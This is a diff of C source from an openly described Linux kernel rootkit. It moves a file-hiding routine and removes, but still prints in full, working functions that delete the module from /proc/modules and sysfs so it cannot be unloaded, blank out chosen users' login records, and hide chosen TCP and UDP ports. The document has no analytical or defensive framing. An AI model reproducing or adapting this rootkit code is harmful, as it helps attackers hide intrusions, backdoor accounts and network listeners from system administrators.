@@ -1,56 +1,9 @@
-#include <linux/module.h>
-#include <linux/kobject.h>
 #include <linux/types.h>
 #include <linux/dirent.h>
-#include <linux/kstrtox.h>
-#include "utmp.h"
-#include "hide.h"
-#include "../utils.h"
-#include "../config.h"
-
-/*
-    Removes this module from the kernel list of modules. This makes it so it
-    doesn't appear in the output of /proc/modules. This function assumes that module_mutex
-    has already been acquired.
-*/
-static void rooti_hideme_from_procs(void)
-{
-    list_del_rcu(&THIS_MODULE->list);
-    synchronize_rcu();
-}
-
-/*
-    Removes the kobject associated with this module from the sysfs hierarchy.
-    This makes it so the kobject corresponding to this modules doesn't show up
-    as a directory under /sys/module. This function assumes that module_mutex
-    has already been acquired.
-*/
-static void rooti_hideme_from_sysfs(void)
-{
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-}
-
-/*
-    Hides the rootkit from userspace by removing the corresponding entries in
-    both procs and sysfs. This also protects it from unloading via tools like rmmod.
-*/
-int rooti_hideme()
-{
-    // The mutex protecting the list of modules is not an exported symbol
-    struct mutex *__module_mutex = (struct mutex *)__kallsyms_lookup_name("module_mutex");
-    if (__module_mutex == NULL) {
-        ROOTI_DEBUG("unresolved symbol: 'module_mutex'");
-        return -EFAULT;
-    }
-
-    // Remove info about this module from various data structures
-    mutex_lock(__module_mutex);
-    rooti_hideme_from_procs();
-    rooti_hideme_from_sysfs();
-    mutex_unlock(__module_mutex);
-
-    return 0;
-}
+#include <linux/string.h>
+#include "dentry.h"
+#include "../../utils.h"
+#include "../../config.h"
 
 // Determines whether a file should be hidden by its full name
 static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
@@ -200,77 +153,4 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
 
     kfree(kernel_buf);
     return count;
-}
-
-// Determines whether the user should be hidden or not, by username
-static bool rooti_should_hide_user(char *username)
-{
-    for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
-        if (strncmp(username, ROOTI_HIDDEN_USERS[i], UT_NAMESIZE) == 0) {
-            return true;
-        }
-    }
-    return false;
-}
-
-/*
-    Rigs the record returned from the utmp file, hiding the record if the user should be hidden.
-    This is achieved by copying the results into kernel space, filling the buffer with zeros and
-    returning the rigged results back into user space.
-*/
-int rooti_hide_login_entry(char *user_buf, size_t count)
-{
-    // Allocate a kernel buffer to store the data returned to user
-    char *kernel_buf = kmalloc(count, GFP_KERNEL);
-    if (kernel_buf == NULL) {
-        ROOTI_DEBUG("failed to allocate memory");
-        return -ENOMEM;
-    }
-
-    // Copy the results into our kernel buffer
-    int err = copy_from_user(kernel_buf, user_buf, count);
-    if (err > 0) {
-        ROOTI_DEBUG("copy_from_user() failed: %d", err);
-        kfree(kernel_buf);
-        return -EFAULT;
-    }
-
-    // Check if the username contained the in the record is of a user that should be hidden
-    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
-    if (rooti_should_hide_user(utmp_buf->ut_user)) {
-        // Match found, fill the buffer with zeros, marking it as invalid
-        memset(kernel_buf, 0, count);
-        // Copy the results back to user space
-        err = copy_to_user(user_buf, kernel_buf, count);
-        if (err > 0) {
-            ROOTI_DEBUG("copy_to_user() failed: %d", err);
-            kfree(kernel_buf);
-            return -EFAULT;
-        }
-    }
-
-    kfree(kernel_buf);
-    return 0;
-}
-
-// Indicates whether the given TCP port should be hidden by the rootkit
-bool rooti_should_hide_tcp_port(unsigned short port)
-{
-    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
-        if (ROOTI_HIDDEN_TCP_PORTS[i] == port) {
-            return true;
-        }
-    }
-    return false;
-}
-
-// Indicates whether the given UDP port should be hidden by the rootkit
-bool rooti_should_hide_udp_port(unsigned short port)
-{
-    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
-        if (ROOTI_HIDDEN_UDP_PORTS[i] == port) {
-            return true;
-        }
-    }
-    return false;
 }
